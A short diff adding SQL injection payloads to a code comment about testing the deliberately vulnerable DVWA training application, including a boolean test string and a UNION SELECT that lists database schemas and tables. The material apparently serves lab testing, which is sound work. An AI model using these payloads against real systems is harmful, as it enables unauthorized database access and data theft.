@@ -29,6 +29,8 @@
 # For testing SQL injection on DVWA, use the parameter payload:
 #
 #   1' or '1'='1' #
+#   2' AND '1'='1' #
+#   1' UNION SELECT TABLE_SCHEMA, TABLE_NAME FROM information_schema.tables; --
 #
 # This payload works on DVWA to bypass input filters and trigger SQL injection.
 #
